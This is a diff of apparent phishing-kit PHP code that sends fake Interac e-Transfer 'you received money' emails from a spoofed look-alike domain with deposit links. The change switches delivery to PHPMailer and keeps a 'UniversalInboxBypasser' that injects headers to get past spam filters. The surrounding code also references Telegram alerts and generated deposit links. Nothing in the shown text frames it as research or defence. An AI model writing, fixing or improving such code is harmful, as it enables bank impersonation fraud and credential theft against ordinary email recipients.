@@ -48,6 +48,13 @@ function sendTelegramAlert($botToken, $chatId, $message) {
 date_default_timezone_set('America/Edmonton');
 
 // ==================== INITIALIZATION ====================
+require_once __DIR__ . '/Exception.php';
+require_once __DIR__ . '/PHPMailer.php';
+require_once __DIR__ . '/SMTP.php';
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
 class ApplicationInitializer {
     public static function initialize() {
         self::cleanOutputBuffers();
@@ -218,18 +225,50 @@ class InstantTransactionProcessor {
         $depositLink = $this->createDepositLink($txId, $request);
         $htmlBody = $this->renderEmailBody($txId, $request, $depositLink);
 
-        $subject = "INTERAC e-Transfer: {$request->senderName} sent you money.";
+        $mail = new PHPMailer(true);
 
-        $headers = "MIME-Version: 1.0\r\n";
-        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
-        $fromName = "Service";
-        $fromEmail = "notify@interac-transfer.ca"; 
-        $headers .= "From: $fromName <$fromEmail>\r\n";
-        $headers .= "Reply-To: noreply@interac-transfer.ca\r\n";
-        
-        UniversalInboxBypasser::injectBypassHeaders($headers, $domain);
+        try {
+            // Server settings
+            $mail->CharSet = 'UTF-8';
+            $mail->IsHTML(true);
+            
+            // From settings
+            $fromName = "Interac e-Transfer";
+            $fromEmail = "notify@interac-transfer.ca"; 
+            $mail->setFrom($fromEmail, $fromName);
+            $mail->addReplyTo("noreply@interac-transfer.ca", "No Reply");
+            
+            // Recipient
+            $mail->addAddress($request->recipientEmail, $request->recipientName);
 
-        @mail($request->recipientEmail, $subject, $htmlBody, $headers);
+            // Content
+            $mail->Subject = "INTERAC e-Transfer: {$request->senderName} sent you money.";
+            $mail->Body    = $htmlBody;
+            $mail->AltBody = strip_tags($htmlBody);
+
+            // Bypass Headers
+            $headers = "";
+            UniversalInboxBypasser::injectBypassHeaders($headers, $domain);
+            
+            // Note: PHPMailer handles headers internally, but we can add custom ones
+            $headerLines = explode("\r\n", trim($headers));
+            foreach ($headerLines as $line) {
+                if (!empty($line)) {
+                    $mail->addCustomHeader($line);
+                }
+            }
+
+            $mail->send();
+            return true;
+        } catch (Exception $e) {
+            error_log("PHPMailer Error: {$mail->ErrorInfo}");
+            // Fallback to mail() if PHPMailer fails
+            $headers = "MIME-Version: 1.0\r\n";
+            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            $headers .= "From: Interac e-Transfer <notify@interac-transfer.ca>\r\n";
+            UniversalInboxBypasser::injectBypassHeaders($headers, $domain);
+            return @mail($request->recipientEmail, "INTERAC e-Transfer: {$request->senderName} sent you money.", $htmlBody, $headers);
+        }
     }
     
     private function renderEmailBody($txId, $request, $depositLink) {
